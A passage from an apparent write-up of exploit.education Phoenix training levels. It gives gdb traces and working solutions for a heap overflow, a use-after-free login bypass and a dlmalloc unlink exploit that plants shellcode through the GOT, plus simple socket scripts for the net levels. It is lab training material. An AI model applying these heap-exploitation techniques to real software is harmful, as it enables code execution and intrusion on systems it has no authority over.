00000000       F *UND*  00000000 sbrk
0804c168 g       .bss   00000000 __bss_start
00000000       F *UND*  00000000 memset
080487d5 g     F .text  000000c5 main
0804aa4f g     F .text  000000d7 mallopt
00000000       F *UND*  00000000 time
0804ab61 g     F .fini  00000001 _fini
0804a14e g     F .text  00000224 memalign
0804c180 g     O .bss   00000004 stderr
0804a46b g     F .text  00000017 cfree
0804a746 g     F .text  0000003e valloc
0804a864 g     F .text  00000175 mallinfo
0804c168 g       .data  00000000 _edata
0804c538 g       .bss   00000000 _end
00000000       F *UND*  00000000 __errno_location
00000000       F *UND*  00000000 __libc_start_main
0804a4a4 g     F .text  0000001b independent_comalloc
0804984a g     F .text  00000280 free
```

### Solved

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/heap-one $(python -c "print('ABCDEFGHIJKLMNOPQRST' + '\x40\xc1\x04\x08')")  $(python -c "print('\x9a\x88\x04\x08')")
Congratulations, you've completed this level @ 1637197307 seconds past the Epoch
```

## Challenge 15 - Heap Two

[Heap Two Code](https://exploit.education/phoenix/heap-two/).

This challenge is solved by using an old heap exploit called use-after-free. The basic concept of the exploit is a program allocated memory on the heap with malloc. That memory is freed at some point during the programs execution. Later on that freed memory is called, but since the memory was freed what gets returned is not what is expected. This do to terrible coding practice and can cause major issues. For this challenge we need to bypass a login by using the UAF exploit. What the program does is it constantly loops and gets user input. It is looking for four things in the user's input. One is "auth", what auth does is free memory on the heap to fit the auth struct, which contains a 32 byte sized char array called name, and an integer called auth. It then sets all the memory in that section of the heap allocated to 0 to clear whatever might have been in there. It then checks to see if the user's input fits in the space on the heap. If it does then the user's input is put on the heap in the name variable's spot. Second input it is looking for is "reset", which just frees the memory allocated for auth. The third input is "service", which just allocates memory on the heap for the string given and then copies the string there. The forth and final input is "login", which checks to see if both the auth struct and auth variable on the heap are not set to zero. If that is so then we are logged in. The problem we can already see is "reset" frees auth and then "login" tries to get the values located at previously allocate auth. So we can now use gdb to see the UAF in action. We disassemble main to place a break during the loop. We then run the program, and continue after hitting the breakpoint. For the user input we give it "auth admin", which places admin on the heap. We hit the breakpoint again then continue we not see the location that the auth struct is allocated to. We enter nothing as user input to hit the breakpoint and check whats in the address location. If we translate the hex to ascii we get "admi", which is what we put on the heap. We then continue the program again this time as the user input we use "reset". This frees the auth struct’s heap memory. After hitting the breakpoint again, we check the auth struct’s old address and find some random data in there. We can see that whatever we had in there is removed. We continue the program one more time, this time we send "service AAAABBBBCCCCDDDD". Which should allocate space on the heap for the string we gave the program and that string should be copied there. At the breakpoint we check the auth struct’s old address and find 41414120, when translated to ascii is " AAA". This means the string we gave the program last time did get copied on to the heap. It was also placed where auth struct was. If we continue the program one last time. We can see the address that is printed out for auth is the same when we first allocated space for it, but it was freed so it is not actually there. We can also see that service has the same address, so it was placed there, because the space was free to use. If we try logging now we get the message that we already are. Which means we solved the challenge, because the program is checking at auth's old address to see if we have logged in. That space was now written with the service's string, hence the program thinking we are logged in.

```bash
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/heap-two
(gdb) disas main
Dump of assembler code for function main:
   0x08048675 <+0>:     lea    ecx,[esp+0x4]
   0x08048679 <+4>:     and    esp,0xfffffff0
   0x0804867c <+7>:     push   DWORD PTR [ecx-0x4]
   0x0804867f <+10>:    push   ebp
   0x08048680 <+11>:    mov    ebp,esp
   0x08048682 <+13>:    push   ecx
   0x08048683 <+14>:    sub    esp,0x84
   0x08048689 <+20>:    sub    esp,0xc
   0x0804868c <+23>:    push   0x8048870
   0x08048691 <+28>:    call   0x8048460 <puts@plt>
   0x08048696 <+33>:    add    esp,0x10
   0x08048699 <+36>:    mov    edx,DWORD PTR ds:0x8049ae0
   0x0804869f <+42>:    mov    eax,ds:0x8049adc
   0x080486a4 <+47>:    sub    esp,0x4
   0x080486a7 <+50>:    push   edx
   0x080486a8 <+51>:    push   eax
   0x080486a9 <+52>:    push   0x80488b9
   0x080486ae <+57>:    call   0x8048440 <printf@plt>
   0x080486b3 <+62>:    add    esp,0x10
   0x080486b6 <+65>:    mov    eax,ds:0x8049ab8
   0x080486bb <+70>:    sub    esp,0x4
   0x080486be <+73>:    push   eax
   0x080486bf <+74>:    push   0x80
   0x080486c4 <+79>:    lea    eax,[ebp-0x88]
   0x080486ca <+85>:    push   eax
   0x080486cb <+86>:    call   0x8048450 <fgets@plt>
   0x080486d0 <+91>:    add    esp,0x10
   0x080486d3 <+94>:    test   eax,eax
   0x080486d5 <+96>:    je     0x8048817 <main+418>
   0x080486db <+102>:   sub    esp,0x4
   0x080486de <+105>:   push   0x5
   0x080486e0 <+107>:   push   0x80488d6
   0x080486e5 <+112>:   lea    eax,[ebp-0x88]
   0x080486eb <+118>:   push   eax
   0x080486ec <+119>:   call   0x8048480 <strncmp@plt>
   0x080486f1 <+124>:   add    esp,0x10
   0x080486f4 <+127>:   test   eax,eax
   0x080486f6 <+129>:   jne    0x8048755 <main+224>
   0x080486f8 <+131>:   sub    esp,0xc
   0x080486fb <+134>:   push   0x24
   0x080486fd <+136>:   call   0x8048470 <malloc@plt>
   0x08048702 <+141>:   add    esp,0x10
   0x08048705 <+144>:   mov    ds:0x8049adc,eax
   0x0804870a <+149>:   mov    eax,ds:0x8049adc
   0x0804870f <+154>:   sub    esp,0x4
   0x08048712 <+157>:   push   0x24
   0x08048714 <+159>:   push   0x0
   0x08048716 <+161>:   push   eax
   0x08048717 <+162>:   call   0x80484a0 <memset@plt>
   0x0804871c <+167>:   add    esp,0x10
   0x0804871f <+170>:   lea    eax,[ebp-0x88]
   0x08048725 <+176>:   add    eax,0x5
   0x08048728 <+179>:   sub    esp,0xc
   0x0804872b <+182>:   push   eax
   0x0804872c <+183>:   call   0x80484c0 <strlen@plt>
   0x08048731 <+188>:   add    esp,0x10
   0x08048734 <+191>:   cmp    eax,0x1e
   0x08048737 <+194>:   ja     0x8048755 <main+224>
   0x08048739 <+196>:   lea    eax,[ebp-0x88]
   0x0804873f <+202>:   add    eax,0x5
   0x08048742 <+205>:   mov    edx,DWORD PTR ds:0x8049adc
   0x08048748 <+211>:   sub    esp,0x8
   0x0804874b <+214>:   push   eax
   0x0804874c <+215>:   push   edx
   0x0804874d <+216>:   call   0x8048430 <strcpy@plt>
   0x08048752 <+221>:   add    esp,0x10
   0x08048755 <+224>:   sub    esp,0x4
   0x08048758 <+227>:   push   0x5
   0x0804875a <+229>:   push   0x80488dc
   0x0804875f <+234>:   lea    eax,[ebp-0x88]
   0x08048765 <+240>:   push   eax
   0x08048766 <+241>:   call   0x8048480 <strncmp@plt>
   0x0804876b <+246>:   add    esp,0x10
   0x0804876e <+249>:   test   eax,eax
   0x08048770 <+251>:   jne    0x8048783 <main+270>
   0x08048772 <+253>:   mov    eax,ds:0x8049adc
   0x08048777 <+258>:   sub    esp,0xc
   0x0804877a <+261>:   push   eax
   0x0804877b <+262>:   call   0x80484d0 <free@plt>
   0x08048780 <+267>:   add    esp,0x10
   0x08048783 <+270>:   sub    esp,0x4
   0x08048786 <+273>:   push   0x6
   0x08048788 <+275>:   push   0x80488e2
   0x0804878d <+280>:   lea    eax,[ebp-0x88]
   0x08048793 <+286>:   push   eax
   0x08048794 <+287>:   call   0x8048480 <strncmp@plt>
   0x08048799 <+292>:   add    esp,0x10
   0x0804879c <+295>:   test   eax,eax
   0x0804879e <+297>:   jne    0x80487ba <main+325>
   0x080487a0 <+299>:   lea    eax,[ebp-0x88]
   0x080487a6 <+305>:   add    eax,0x7
   0x080487a9 <+308>:   sub    esp,0xc
   0x080487ac <+311>:   push   eax
   0x080487ad <+312>:   call   0x8048490 <strdup@plt>
   0x080487b2 <+317>:   add    esp,0x10
   0x080487b5 <+320>:   mov    ds:0x8049ae0,eax
   0x080487ba <+325>:   sub    esp,0x4
   0x080487bd <+328>:   push   0x5
   0x080487bf <+330>:   push   0x80488ea
   0x080487c4 <+335>:   lea    eax,[ebp-0x88]
   0x080487ca <+341>:   push   eax
   0x080487cb <+342>:   call   0x8048480 <strncmp@plt>
   0x080487d0 <+347>:   add    esp,0x10
   0x080487d3 <+350>:   test   eax,eax
   0x080487d5 <+352>:   jne    0x8048699 <main+36>
   0x080487db <+358>:   mov    eax,ds:0x8049adc
   0x080487e0 <+363>:   test   eax,eax
   0x080487e2 <+365>:   je     0x8048802 <main+397>
   0x080487e4 <+367>:   mov    eax,ds:0x8049adc
   0x080487e9 <+372>:   mov    eax,DWORD PTR [eax+0x20]
   0x080487ec <+375>:   test   eax,eax
   0x080487ee <+377>:   je     0x8048802 <main+397>
   0x080487f0 <+379>:   sub    esp,0xc
   0x080487f3 <+382>:   push   0x80488f0
   0x080487f8 <+387>:   call   0x8048460 <puts@plt>
   0x080487fd <+392>:   add    esp,0x10
   0x08048800 <+395>:   jmp    0x8048812 <main+413>
   0x08048802 <+397>:   sub    esp,0xc
   0x08048805 <+400>:   push   0x804890c
   0x0804880a <+405>:   call   0x8048460 <puts@plt>
   0x0804880f <+410>:   add    esp,0x10
   0x08048812 <+413>:   jmp    0x8048699 <main+36>
   0x08048817 <+418>:   nop
   0x08048818 <+419>:   mov    eax,0x0
   0x0804881d <+424>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x08048820 <+427>:   leave  
   0x08048821 <+428>:   lea    esp,[ecx-0x4]
   0x08048824 <+431>:   ret    
End of assembler dump.
(gdb) break *0x080486a9
Breakpoint 1 at 0x80486a9
(gdb) r
Starting program: /opt/phoenix/i486/heap-two 
Welcome to phoenix/heap-two, brought to you by https://exploit.education

Breakpoint 1, 0x080486a9 in main ()
(gdb) c
Continuing.
[ auth = 0, service = 0 ]
auth admin

Breakpoint 1, 0x080486a9 in main ()
(gdb) c
Continuing.
[ auth = 0x8049af0, service = 0 ]


Breakpoint 1, 0x080486a9 in main ()
(gdb) x/wx 0x8049af0
0x8049af0:      0x696d6461
(gdb) c
Continuing.
[ auth = 0x8049af0, service = 0 ]
reset

Breakpoint 1, 0x080486a9 in main ()
(gdb) x/wx 0x8049af0
0x8049af0:      0xf7ffb958
(gdb) c
Continuing.
[ auth = 0x8049af0, service = 0 ]
service AAAABBBBCCCCDDDD

Breakpoint 1, 0x080486a9 in main ()
(gdb) x/wx 0x8049af0
0x8049af0:      0x41414120
(gdb) c
Continuing.
[ auth = 0x8049af0, service = 0x8049af0 ]
login
you have logged in already!

Breakpoint 1, 0x080486a9 in main ()
```

### Solved

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/heap-two
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth admin
[ auth = 0x8049af0, service = 0 ]
reset
[ auth = 0x8049af0, service = 0 ]
service AAAABBBBCCCCDDDD
[ auth = 0x8049af0, service = 0x8049af0 ]
login
you have logged in already!
```

## Challenge 16 - Heap Three

[Heap Three Code](https://exploit.education/phoenix/heap-three/).

This challenge is arguably the hardest one in the Phoenix section. It requires a great understanding of the heap. The best resource to learn a lot about this exploit is [here](http://phrack.org/issues/57/9.html). The bug is not in the program its self even though the program doesn't check if the command arguments are greater than the allocated space on the heap. The bug is in the standard library more specifically its in the free function. It has to do with the way the unlink macro works. 

We'll dissemble the main function and set breakpoints at these the standard library function calls, strcpy, free, and printf. When we arrive at the first breakpoint we can find the heap with info proc mappings. This gets us the memory location, 0xf7e69000, for the heap. It has the size of the heap in hex is 0x100000, but we only need to print about 50 or so word addresses, because each allocation the program does on the heap is 32 bytes. We can see that on the heap there is 0x29, which is 41 in decimal, spread out. Those are where the program allocated space when using malloc. Malloc rounds the allocation up so really 40 bytes have been allocated for each use of malloc. There is an extra bit set at the end of each malloc to tell the malloc algorithm that the last chuck is in use. The last address that is set on the heap contain how big of the heap is left to allocate. As we continue the program through the strcpy calls we can see each of our command arguments get put on heap.  After the first free call we can see that the first address of Cs gets wiped but nothing else happens. Then the second call adds 0xf7e69050 where the first address of the Bs where. That tell the malloc algorithm where the next free chunk is. Then after the last free call this, 0xf7e69028, is added to the address location of the As and what that does is point to the other pointer that points to the first freed chunk. You may be wondering why the addresses containing the allocated sizes didn't get reset or why the last bit that says if the previous chunk is in use wasn't set to 0. This is due to the sizes of the chunks allocated. They are very small and the algorithm for malloc is built for speed. The pointers that the free calls added are enough. They say which chunks are free to use next. 

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080487fc <+0>:     lea    ecx,[esp+0x4]
   0x08048800 <+4>:     and    esp,0xfffffff0
   0x08048803 <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048806 <+10>:    push   ebp
   0x08048807 <+11>:    mov    ebp,esp
   0x08048809 <+13>:    push   ebx
   0x0804880a <+14>:    push   ecx
   0x0804880b <+15>:    sub    esp,0x10
   0x0804880e <+18>:    mov    ebx,ecx
   0x08048810 <+20>:    sub    esp,0xc
   0x08048813 <+23>:    push   0x20
   0x08048815 <+25>:    call   0x80490e9 <malloc>
   0x0804881a <+30>:    add    esp,0x10
   0x0804881d <+33>:    mov    DWORD PTR [ebp-0xc],eax
   0x08048820 <+36>:    sub    esp,0xc
   0x08048823 <+39>:    push   0x20
   0x08048825 <+41>:    call   0x80490e9 <malloc>
   0x0804882a <+46>:    add    esp,0x10
   0x0804882d <+49>:    mov    DWORD PTR [ebp-0x10],eax
   0x08048830 <+52>:    sub    esp,0xc
   0x08048833 <+55>:    push   0x20
   0x08048835 <+57>:    call   0x80490e9 <malloc>
   0x0804883a <+62>:    add    esp,0x10
   0x0804883d <+65>:    mov    DWORD PTR [ebp-0x14],eax
   0x08048840 <+68>:    mov    eax,DWORD PTR [ebx+0x4]
   0x08048843 <+71>:    add    eax,0x4
   0x08048846 <+74>:    mov    eax,DWORD PTR [eax]
   0x08048848 <+76>:    sub    esp,0x8
   0x0804884b <+79>:    push   eax
   0x0804884c <+80>:    push   DWORD PTR [ebp-0xc]
   0x0804884f <+83>:    call   0x8048560 <strcpy@plt>
   0x08048854 <+88>:    add    esp,0x10
   0x08048857 <+91>:    mov    eax,DWORD PTR [ebx+0x4]
   0x0804885a <+94>:    add    eax,0x8
   0x0804885d <+97>:    mov    eax,DWORD PTR [eax]
   0x0804885f <+99>:    sub    esp,0x8
   0x08048862 <+102>:   push   eax
   0x08048863 <+103>:   push   DWORD PTR [ebp-0x10]
   0x08048866 <+106>:   call   0x8048560 <strcpy@plt>
   0x0804886b <+111>:   add    esp,0x10
   0x0804886e <+114>:   mov    eax,DWORD PTR [ebx+0x4]
   0x08048871 <+117>:   add    eax,0xc
   0x08048874 <+120>:   mov    eax,DWORD PTR [eax]
   0x08048876 <+122>:   sub    esp,0x8
   0x08048879 <+125>:   push   eax
   0x0804887a <+126>:   push   DWORD PTR [ebp-0x14]
   0x0804887d <+129>:   call   0x8048560 <strcpy@plt>
   0x08048882 <+134>:   add    esp,0x10
   0x08048885 <+137>:   sub    esp,0xc
   0x08048888 <+140>:   push   DWORD PTR [ebp-0x14]
   0x0804888b <+143>:   call   0x8049857 <free>
   0x08048890 <+148>:   add    esp,0x10
   0x08048893 <+151>:   sub    esp,0xc
   0x08048896 <+154>:   push   DWORD PTR [ebp-0x10]
   0x08048899 <+157>:   call   0x8049857 <free>
   0x0804889e <+162>:   add    esp,0x10
   0x080488a1 <+165>:   sub    esp,0xc
   0x080488a4 <+168>:   push   DWORD PTR [ebp-0xc]
   0x080488a7 <+171>:   call   0x8049857 <free>
   0x080488ac <+176>:   add    esp,0x10
   0x080488af <+179>:   sub    esp,0xc
   0x080488b2 <+182>:   push   0x804abc2
   0x080488b7 <+187>:   call   0x80485b0 <puts@plt>
   0x080488bc <+192>:   add    esp,0x10
   0x080488bf <+195>:   mov    eax,0x0
   0x080488c4 <+200>:   lea    esp,[ebp-0x8]
   0x080488c7 <+203>:   pop    ecx
   0x080488c8 <+204>:   pop    ebx
   0x080488c9 <+205>:   pop    ebp
   0x080488ca <+206>:   lea    esp,[ecx-0x4]
   0x080488cd <+209>:   ret    
End of assembler dump.
(gdb) break *0x0804884f
Breakpoint 1 at 0x804884f
(gdb) break *0x08048866
Breakpoint 2 at 0x8048866
(gdb) break *0x0804887d
Breakpoint 3 at 0x804887d
(gdb) break *0x0804888b
Breakpoint 4 at 0x804888b
(gdb) break *0x08048899
Breakpoint 5 at 0x8048899
(gdb) break *0x080488a7
Breakpoint 6 at 0x80488a7
(gdb) break *0x080488b7
Breakpoint 7 at 0x80488b7
(gdb) r AAAAAAAAA BBBBBBBB CCCCCCCC
Starting program: /opt/phoenix/i486/heap-three AAAAAAAAA BBBBBBBB CCCCCCCC

Breakpoint 1, 0x0804884f in main ()
(gdb) info proc mappings
process 304
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804c000     0x4000        0x0 /opt/phoenix/i486/heap-three
         0x804c000  0x804d000     0x1000     0x3000 /opt/phoenix/i486/heap-three
        0xf7e69000 0xf7f69000   0x100000        0x0 
        0xf7f69000 0xf7f6b000     0x2000        0x0 [vvar]
        0xf7f6b000 0xf7f6d000     0x2000        0x0 [vdso]
        0xf7f6d000 0xf7ffa000    0x8d000        0x0 /opt/phoenix/i486-linux-musl/lib/libc.so
        0xf7ffa000 0xf7ffb000     0x1000    0x8c000 /opt/phoenix/i486-linux-musl/lib/libc.so
        0xf7ffb000 0xf7ffc000     0x1000    0x8d000 /opt/phoenix/i486-linux-musl/lib/libc.so
        0xf7ffc000 0xf7ffe000     0x2000        0x0 
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

//strcpy calls
        
(gdb) x/50wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x00000000      0x00000000
0xf7e69010:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x00000000      0x00000000
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x08048866 in main ()
(gdb) x/50wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
0xf7e69010:     0x00000041      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x00000000      0x00000000
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000
(gdb) c
Continuing.

Breakpoint 3, 0x0804887d in main ()

(gdb) x/50wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
0xf7e69010:     0x00000041      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x42424242      0x42424242      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x00000000      0x00000000
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000

//free calls

(gdb) c
Continuing.

Breakpoint 4, 0x0804888b in main ()
(gdb) x/50wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
0xf7e69010:     0x00000041      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x42424242      0x42424242      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x43434343      0x43434343
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000
(gdb) c
Continuing.

Breakpoint 5, 0x08048899 in main () 
(gdb) x/50wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
0xf7e69010:     0x00000041      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x42424242      0x42424242      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x00000000      0x43434343
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000
(gdb) c
Continuing.

Breakpoint 6, 0x080488a7 in main ()
(gdb) x/50wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
0xf7e69010:     0x00000041      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0xf7e69050      0x42424242      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x00000000      0x43434343
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000

//printf call

(gdb) c
Continuing.

Breakpoint 7, 0x080488b7 in main ()
(gdb) x/50wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0xf7e69028      0x41414141
0xf7e69010:     0x00000041      0x00000000      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0xf7e69050      0x42424242      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x00000000      0x43434343
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000
```

What we want to happen when free is called is to have the macro unlink get called. Why? What unlink does is whatever is in address bk, which is the 2 previous address behind the chunk size address, is put into where ever the address fd, which is the 3 previous address behind the chunk size address, is pointing to. The problem for later is that the reverse happens, meaning if we set bk to the winner function fd will be written to it, which can't happen, and would cause a seg fault. To get the free function to call the unlink macro we need to have an already freed chunk after the chunk we currently want to free. The already freed chunk will contain the address fd and bk, which we need to gain code execution. The free function calls the unlink macro, because it wants to merge the chunk that's getting freed with the one that is already freed. The free function is moves the fd to where bk is pointing and fd is moved to where the bk is pointing. In order for this to work we need the chunk that's being freed to be set to a size greater 80 bytes, because under that size the chunk is considered a fast bin and unlink will not be called. 

Thinking about how to setup the script, we need the second command argument to overflow in the heap and write x65 to where the third allocated heap chunk size is. This sets the third heap chunk's size to 100 and says the previous chunk is in use. We need it to be 100, because otherwise the chunk is a fast bin. We can't merge the third chunk with the second chunk because it is in use, so we need to merge with a chunk after the third. To do this we need the third command argument add 2 fake allocated chunks the first chunk needs to looks like they was already freed and the values we want in the fd and bk addresses. The second fake chunk needs the last bit in its size to be 0, which tell malloc that the previous fake chunk is not in use. The only problem is we can't use small values for setting the size of a chunks, because we can't use null bytes. To get around this we can use really large bytes like FFFFFFFC. The reason for this is because how negative numbers are represented in memory, That the value is actually -4. Since it is a negative number the malloc algorithm will look 4 bytes back for next next chunk allocated, we can use FFFFFFFC again because its last bit isn't set telling malloc that the first fake chunk we made isn't in use and to merge it with the third allocated chunk. The next problem is we know we cant put the winner functions location as one of the values, because of a seg fault, but we can put in the location on the heap where the first command argument gets written to. This allows us to put shellcode into the heap with the first command argument. Then when the third allocated heap chunk is freed that shellcode is placed into the GOT where the puts function is located. Allowing us to have code execution.

The problem is how do we get our shellcode to call winner. We'll we can use a website like [this](https://defuse.ca/online-x86-assembler.htm) to create a shellcode that calls winner for us. We just make assemble code that puts the location of the jumps to the winner function. Last thing we need to do is add 12 to the heap location to get the location of our shellcode and that means we need to also minus 12 to the puts GOT address, which means finally have all we need to solve the challenge.

```bash
user@phoenix-amd64:~$ objdump -d /opt/phoenix/i486/heap-three | grep winner
080487d5 <winner>:
user@phoenix-amd64:~$ objdump -R /opt/phoenix/i486/heap-three | grep puts
0804c13c R_386_JUMP_SLOT   puts
```

```asm
push 0x80487d5
ret
```

### Solved

```python
ar1 = 'AAAA' + '\x68\xd5\x87\x04\x08\xc3' + " "
ar2 = "B" * 36 + '\x65' + " "
ar3 = "C" * 92 + '\xFC\xFF\xFF\xFF' + '\xFC\xFF\xFF\xFF' + '\x30\xc1\x04\x08' + '\x0C\x90\xE6\xF7' + " "
print(ar1 + ar2 + ar3)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/heap-three $(python heap-three.py)
Level was successfully completed at @ 1637450523 seconds past the Epoch
```

## Challenge 17 - Net Zero

[Net Zero Code](https://exploit.education/phoenix/net-zero/).

This challenge is less about exploitation knowledge and more about programming knowledge. All we need to do is write a python script that receives information a random number from a socket. The script then converts it to a little endian, 32bit integer and then sends that back to the program through a socket. The python libraries socket and struct are the only things we need to do this. The socket library allows us to connect to a socket using python, and the struct library allows us to convert a number to a byte sting representation, which is what the program is looking for. Creating the script is all we need to solve the challenge.

### Solved

```python
import struct
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64000
s.connect((host,port))

print(s.recv(1024))
print(s.recv(1024))
data = s.recv(1024)
print(data)
num = data.split("\'")[1]

s.send(struct.pack("I", int(num)))

print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ python net-zero.py 
Welcome to phoenix/net-zero, brought to you by https://exploit.education


Please send '1409653197' as a little endian, 32bit integer.

You have successfully passed this level, well done!
```

## Challenge 18 - Net One

[Net One Code](https://exploit.education/phoenix/net-one/).

This challenge is exactly like the previous one, but instead of receiving a number we receive a byte string representation of a number. All we need to do differently is call struct's unpack function, which converts bytes to and integer. Changing the script solves the challenge.

### Solved

```python
import struct
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64001
s.connect((host,port))

print(s.recv(1024))
print(s.recv(1024))
data = s.recv(1024)
print(data)
s.send(str(struct.unpack("I", data)[0]) + "\n")
print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ python net-one.py 
Welcome to phoenix/net-one, brought to you by https://exploit.education


�o��
Congratulations, you've passed this level!
```

## Challenge 19 - Net Two

[Net Two Code](https://exploit.education/phoenix/net-two/).

This challenge is exactly like the previous net challenges. The trick to this one is we are receiving a long in byte form and need to convert it back to a long value. We just need to loop over the 8 section of bytes the program sends that contains the long number's value. After we receive each byte we convert is to an integer using struct's unpack function and have a  sum of the total value sent over. We first use a mask to avoid integer overflow. Then we pack the number back up as a long and send it back to the program. Creating this script solves the challenge.

### Solved

```python
import struct
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64002
s.connect((host,port))

print(s.recv(1024))
print(s.recv(1024))
num = 0
for i in range(8):
        data = s.recv(1024)
        num += struct.unpack("L", data)[0]
num &= 0xffffffffffffffff
s.send(struct.pack("l", num))
print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ python net-two.py 
Welcome to phoenix/net-two, brought to you by https://exploit.education
For this level, sizeof(long) == 
8, keep that in mind :)

You have successfully passed this level, well done!
```

## Challenge 20 - Final Zero

[Final Zero Code](https://exploit.education/phoenix/final-zero/).

Like the challenge 6, Stack Five, we have to do a buffer overflow to run our own shellcode and have a command shell open inside the program. The difference is that we are doing this over sockets and don't have an easy way to debug what's happening in the program. The first thing we should do is find a spot to have a breakpoint in the get_username function. Right before return call, 0x00000000004008b0, is a good place since we will overwriting where get_username returns to.

```bash
